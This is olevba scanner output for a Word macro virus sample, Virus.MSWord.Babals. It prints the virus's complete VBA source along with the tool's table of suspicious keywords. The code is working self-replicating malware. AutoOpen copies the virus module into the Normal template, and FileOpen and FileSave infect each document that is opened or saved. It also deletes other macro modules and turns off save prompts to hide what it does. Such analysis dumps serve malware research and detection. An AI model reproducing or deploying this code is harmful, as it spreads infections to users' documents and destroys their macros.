olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Babals-451992ba5c25695b03979be72f3787735968c54d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Babals-451992ba5c25695b03979be72f3787735968c54d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ไวรัส.bas 
in file: Virus.MSWord.Babals-451992ba5c25695b03979be72f3787735968c54d - OLE stream: 'Macros/VBA/ไวรัส'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'=================================================
'   นี่คือไวรัส W97M,Babals ฉบับย่อ โดย กูเอง
'=================================================

Sub VirusDocument(Copy As Boolean)
    Ok = True
    For Each Obj In IIf(Copy, NormalTemplate, ActiveDocument).VBProject.VBComponents
        If Obj.Name = "ไวรัส" Then Ok = False
        If Obj.Name <> "ไวรัส" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete IIf(Copy, NormalTemplate, ActiveDocument).FullName, Obj.Name, wdOrganizerObjectProjectItems
        End If
    Next Obj
    If Ok Then
        Application.OrganizerCopy IIf(Copy, ActiveDocument, NormalTemplate).FullName, IIf(Copy, NormalTemplate, ActiveDocument).FullName, "ไวรัส", wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub FileOpen()
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        VirusDocument False
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Options.SaveNormalPrompt = False
    Options.VirusProtection = True
    Options.SavePropertiesPrompt = False
    VirusDocument True
    On Error Resume Next
    NormalTemplate.Save
End Sub

Sub FileClose()
    End Sub

Sub FileSave()
    If ActiveDocument.Saved = False Then
        VirusDocument False
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

